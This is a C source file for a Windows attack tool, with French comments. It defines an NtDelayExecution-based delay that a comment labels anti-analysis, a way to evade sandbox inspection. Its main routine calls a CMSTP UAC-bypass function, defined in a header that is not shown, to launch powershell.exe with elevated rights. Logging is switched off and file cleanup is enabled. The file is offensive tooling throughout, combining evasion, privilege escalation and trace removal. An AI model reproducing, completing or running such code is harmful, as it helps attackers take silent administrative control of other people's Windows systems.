#include "cmstp_bypass.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Suppress function cast warning for API calls
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"

typedef NTSTATUS(NTAPI* fnNtDelayExecution)(
	BOOLEAN              Alertable,
	PLARGE_INTEGER       DelayInterval
	);

BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {

	// Converting minutes to milliseconds
	DWORD                   dwMilliSeconds         = (DWORD)(ftMinutes * 60000);
	LARGE_INTEGER           DelayInterval          = { 0 };
	LONGLONG                Delay                  = 0;
	NTSTATUS                STATUS                 = 0;
	fnNtDelayExecution      pNtDelayExecution      = NULL;
	DWORD                   _T0                    = 0,
	                        _T1                    = 0;

	// Get NtDelayExecution function pointer
	HMODULE hNtdll = GetModuleHandleA("NTDLL.DLL");
	if (hNtdll) {
		pNtDelayExecution = (fnNtDelayExecution)GetProcAddress(hNtdll, "NtDelayExecution");
	}
	
	if (!pNtDelayExecution) {
		printf("[!] Failed to get NtDelayExecution function pointer\n");
		return FALSE;
	}

	printf("[i] Delaying Execution Using \"NtDelayExecution\" For %lu Seconds\n", (dwMilliSeconds / 1000));

	// Converting from milliseconds to the 100-nanosecond - negative time interval
	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	_T0 = (DWORD)GetTickCount64();

	// Sleeping for 'dwMilliSeconds' ms 
	if ((STATUS = pNtDelayExecution(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
		printf("[!] NtDelayExecution Failed With Error : 0x%08lX \n", (unsigned long)STATUS);
		return FALSE;
	}

	_T1 = (DWORD)GetTickCount64();

	// Slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_NtDE' succeeded, otherwize it failed
	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
		return FALSE;

	printf("\n\t>> _T1 - _T0 = %lu \n", (unsigned long)(_T1 - _T0));

	printf("[+] DONE \n");

	return TRUE;
}

#pragma GCC diagnostic pop

int main(int argc, char* argv[]) {
    // Anti-analyse: délai avant exécution
    DelayExecutionVia_NtDE(0.05f); // 3 secondes
    CMSTPConfig config;
    InitializeCMSTPConfig(&config);
    
    config.command = "powershell.exe";  // Commande à exécuter, peut être modifiée pour d'autres commandes
    
    // Option 1: Mode debug activable directement dans le code
    config.enableLogging = FALSE;  // Changer à TRUE pour activer les logs de debug
    
    config.cleanupFiles = TRUE;
    config.windowTimeout = config.enableLogging ? 15000 : 10000;  // Plus de temps en debug
    config.confirmationDelay = config.enableLogging ? 1000 : 500; // Plus de délai en debug
    
    ExecuteWithCMSTPBypass(&config);
    
    return 0;
}
